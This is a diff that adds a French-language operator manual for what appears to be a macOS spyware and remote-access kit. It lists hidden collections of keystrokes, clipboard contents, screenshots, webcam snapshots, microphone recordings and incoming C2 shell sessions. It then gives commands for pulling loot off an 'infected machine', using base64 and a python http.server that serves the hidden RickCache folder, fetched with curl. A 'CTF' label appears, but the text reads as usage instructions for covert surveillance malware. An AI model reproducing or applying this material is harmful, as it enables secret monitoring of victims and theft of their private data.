@@ -1,0 +1,23 @@
+RECEPTION - MODE D'EMPLOI
+=========================
+
+Chaque dossier se remplit automatiquement (synchronisation toutes les 5 s
+depuis la zone de capture cachee de la machine, quand le collecteur tourne) :
+
+  Clavier/           .sys.log        - chaque touche tapee, horodatee
+  Presse-papiers/    .clip.log       - tout ce qui a ete copie
+  Ecrans/            scr_*.png       - capture d'ecran toutes les 30 s
+  Webcam/            cam_*.png       - snapshot toutes les 15 s
+  Micro/             rec_*.wav       - WAV de 60 s en continu
+  Shells/            session_*.log   - chaque session shell entrante (C2)
+  Butin_distante/    - ce que tu rapatries des cibles a distance via le shell
+
+SUR UNE CIBLE DISTANTE (CTF) :
+le butin vit sur SA machine (~/Library/Application Support/RickCache).
+Depuis ton shell C2, tu le rapatries avec :
+  base64 -i <fichier>            (petits fichiers texte, copier-coller)
+ou tu le sers :
+  python3 -m http.server 9000 --directory ~/Library/Application\ Support/RickCache
+puis de ton cote : curl http://IP_CIBLE:9000/...
+
+Arret total de tout : zsh delivery/uninstall.sh (sur la machine infectee)
